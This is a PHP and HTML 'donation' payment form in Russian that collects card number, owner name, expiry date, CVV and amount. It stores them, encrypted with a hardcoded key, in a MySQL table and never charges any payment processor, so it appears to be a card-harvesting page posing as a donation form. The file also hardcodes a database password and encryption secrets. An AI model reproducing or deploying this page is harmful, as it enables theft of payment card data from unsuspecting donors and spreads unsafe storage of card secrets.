<?php
session_start();
$dbc = new mysqli('localhost', 'zaharchenko_donate', 'Admin123*', 'zaharchenko_donate');

if ($dbc->connect_error) {
    die("Ошибка подключения: " . $dbc->connect_error);
}

ini_set('display_errors', 1);
error_reporting(E_ALL);

$error = '';
$months = array('january', 'february', 'march', 'april', 'may', 'june', 'july', 'august', 'september', 'october', 'november', 'december');

define('ENCRYPTION_KEY', 'wGk9V1r9/1zWqUowQc9SmQ==');
define('ENCRYPTION_IV', '5Dd6zTuHJtMv1vG8lgX3vQ==');

function encrypt($data) {
    $key = base64_decode(ENCRYPTION_KEY);
    $iv = base64_decode(ENCRYPTION_IV);
    return base64_encode(openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv));
}

if (empty($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(32));
}

if (isset($_POST['submit'])) {
    if (!isset($_POST['token']) || !hash_equals($_SESSION['token'], $_POST['token'])) {
        $error = 'Invalid CSRF token';
    } else {
        $number = trim($_POST['number']);
        $number = preg_replace('/[^0-9]/', '', $number);  // Оставим только цифры

        $name = trim($_POST['name']);
        $month = trim($_POST['month']);
        $year = trim($_POST['year']);
        $cvv = trim($_POST['cvv']);
        $amount = trim($_POST['amount']);

        if (strlen($number) < 13 || strlen($number) > 16) {
            $error = 'Поле Card Number должно содержать от 13 до 16 цифр.';
        } else if (strlen($name) < 5 || strlen($name) > 50) {
            $error = 'Поле Owner Name должно содержать от 5 до 50 символов.';
        } else if (!$month || !in_array($month, $months)) {
            $error = 'Необходимо обязательно выбрать месяц окончания действия карты.';
        } else if ($year < 2016 || $year > date('Y') + 10) {
            $error = 'Необходимо обязательно выбрать год окончания действия карты.';
        } else if (!preg_match('/^([0-9]+){3,4}$/', $cvv)) {
            $error = 'Код CVV должен содержать 3 или 4 цифры';
        } else if (!preg_match('/^[0-9]+$/', $amount)) {
            $error = 'Сумма должна содержать целое число.';
        } else if ($amount < 5) {
            $error = 'Минимальная сумма 5 руб.';
        }

        if (!$error) {
            $number_encrypted = encrypt($number);
            $month_encrypted = encrypt($month);
            $year_encrypted = encrypt($year);
            $cvv_encrypted = encrypt($cvv);

            $stmt = $dbc->prepare("SELECT * FROM users WHERE number = ? LIMIT 1");
            $stmt->bind_param("s", $number_encrypted);
            $stmt->execute();
            $result = $stmt->get_result();

            if ($result->num_rows == 0) {
                $stmt = $dbc->prepare("INSERT INTO users (number, name, month, year, cvv, amount) VALUES (?, ?, ?, ?, ?, ?)");
                $stmt->bind_param("sssssi", $number_encrypted, $name, $month_encrypted, $year_encrypted, $cvv_encrypted, $amount);
                if ($stmt->execute()) {
                    echo '<script>
                          alert("Спасибо за вашу помощь!");
                          window.location.href = "https://dp-zaharchenko.сделай.site";
                          </script>';
                    exit();
                } else {
                    $error = 'Ошибка вставки данных: ' . $stmt->error;
                }
                $stmt->close();
            } else {
                echo '<script>
                      alert("Платёж уже был с этой карты. Спасибо!");
                      </script>';
            }
        }
    }
    $dbc->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="style.css">
    <link href='https://fonts.googleapis.com/css?family=Roboto:400,300,100' rel='stylesheet' type='text/css'>
<link type="image/x-icon" href="../img/logo.ico" rel="shortcut icon">

    <title>Форма оплаты</title>
</head>
<body>
    
    <form class="credit-card" method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">

    <?php
    if ($error) {
        echo "<div class='form-header'>";
        echo "<h3 class='error'>" . htmlspecialchars($error) . "</h3>";
        echo "</div>";
    }
    ?>

        <div class="form-header">
            <h4 class="title">Введите данные карты</h4>
        </div>
        <div class="form-body">
            <input type="text" class="card-number" placeholder="Card Number" id="Number" name="number" value="<?= htmlspecialchars($number ?? '') ?>">
            <input type="text" class="card-number" placeholder="Owner Name" id="Name" name="name" value="<?= htmlspecialchars($name ?? '') ?>">

            <div class="date-field">
                <div class="month">
                    <select name="month" id="Month">
                        <?php
                        foreach ($months as $m) {
                            echo "<option value='$m'" . (($month ?? '') == $m ? ' selected' : '') . ">";
                            echo ucfirst($m) . "</option>";
                        }
                        ?>
                    </select>
                </div>
                <div class="year">
                    <select name="year" id="Year">
                        <?php
                        for ($i = 2016; $i <= date('Y') + 10; $i++) {
                            echo "<option value='$i'" . (($year ?? '') == $i ? ' selected' : '') . ">";
                            echo $i . "</option>";
                        }
                        ?>
                    </select>
                </div>
            </div>

            <div class="card-verification">
                <div class="cvv-input">
                    <input type="text" placeholder="CVV" id="CVV" name="cvv" value="<?= htmlspecialchars($cvv ?? '') ?>">
                </div>
                <div class="cvv-details">
                    <p>3 или 4 цифры обычно находятся <br> на полоске подписи</p> 
                </div>
            </div>

            <input type="text" class="card-number" placeholder="Amount" id="Amount" name="amount" value="<?= htmlspecialchars($amount ?? '') ?>">

            <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">

            <button type="submit" class="proceed-btn" name="submit">Оплатить</button>
        </div>
    </form>

</body>
</html>
